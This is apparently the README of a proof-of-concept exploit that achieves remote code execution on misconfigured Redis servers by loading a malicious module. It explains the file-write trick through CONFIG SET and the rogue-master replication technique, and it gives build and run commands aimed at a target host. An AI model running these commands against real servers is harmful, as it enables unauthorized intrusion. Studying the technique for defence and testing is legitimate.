# redis-module-rce

A practical Proof-of-Concept (PoC) demonstrating remote code execution (RCE) in Redis via module loading. This exploit targets Redis instances with misconfigurations or weak security controls that allow loading of arbitrary `.so` modules into the Redis server process. This project is built on the foundational work of the following two excellent PoCs:

- [Redis Rogue Server Exploit](https://github.com/n0b0dyCN/redis-rogue-server)
- [Redis Module for Code Execution](https://github.com/n0b0dyCN/RedisModules-ExecuteCommand)

All credit to the original authors for their research and contributions.

## Vulnerability Overview

This vulnerability leverages Redis's ability to load shared object (`.so`) modules at runtime. If an attacker can gain access to an exposed or misconfigured Redis instance, they can execute arbitrary code on the target system. Exploitation requires two conditions to be met:

1. **Privileged Access to Redis**
   - The attacker must be able to issue privileged Redis commands such as `MODULE LOAD`.
   - This is possible if:
     - The Redis instance is exposed to the internet without authentication.
     - The attacker has acquired valid credentials to an authenticated instance.
   - Redis does not restrict module loading by default. Unless explicitly disabled, this capability is broadly accessible in insecure deployments.

2. **Writable Location on Target Filesystem**
   - The attacker must be able to place a malicious `.so` file on the target machine.
   - Two main techniques can be used:
       - Abuse Redis’s persistence settings: using `CONFIG SET dir` and `CONFIG SET dbfilename`, combined with `SAVE`, an attacker can write arbitrary files to locations such as `/tmp/`.
       - Upload externally: if another service (e.g., FTP) exposes a writable path, the attacker can upload the `.so` file and instruct Redis to load it by its absolute path.

Once the malicious module is in place, Redis will load it and execute the attacker's code within the server's process space, effectively achieving RCE.

## Project Structure

```bash
.
├── redis-rce.py          -> Exploit script (Python)
└── module/
    ├── module.c          -> Malicious Redis module source
    ├── redismodule.h     -> Redis module API header
    └── Makefile          -> Build file for compiling module.so
```

## Requirements

- Python 3.x
- GCC (for compiling the malicious module)
- Redis server (v4.0 or later)
- Target Redis instance must be:
  - Accessible from the attacker's machine
  - Accepting configuration changes (`CONFIG SET`, `MODULE LOAD`, etc.)

## Building the Module

To compile the malicious `.so` module:
```bash
cd module
make
```
This will generate the shared object file: `module.so`

## Running the Exploit

Basic usage:

```bash
python3 redis-rce.py --rhost <target_ip> --lhost <your_ip>
```

Arguments:
```bash
$ ./redis-rce.py -h
Usage: redis-rce.py [options]

Options:
  -h, --help           show this help message and exit
  --rhost=REMOTE_HOST  target host
  --rport=REMOTE_PORT  target redis port (default 6379)
  --lhost=LOCAL_HOST   rogue server ip
  --lport=LOCAL_PORT   rogue server listen port (default 6379)
  --exp=EXP_FILE       Redis Module to load (default module.so)
  -v, --verbose        Show full data stream (optional)
  --passwd=RPASSWD     target redis password (optional)
```

Example:
```bash
python3 redis-rce.py --rhost 10.10.10.100 --lhost 192.168.45.100 --lport 6379 --exp module/module.so
```
Note: The exploit script includes a rogue server that mimics a Redis master. When the target is tricked into becoming a slave of this rogue server, it fetches and writes the malicious payload to disk, which is then loaded via `MODULE LOAD`.

## Disclaimer

This tool is provided for educational and research purposes only. Unauthorized use against targets without explicit permission is strictly prohibited. The authors accept no liability for any misuse or damage caused by this software.

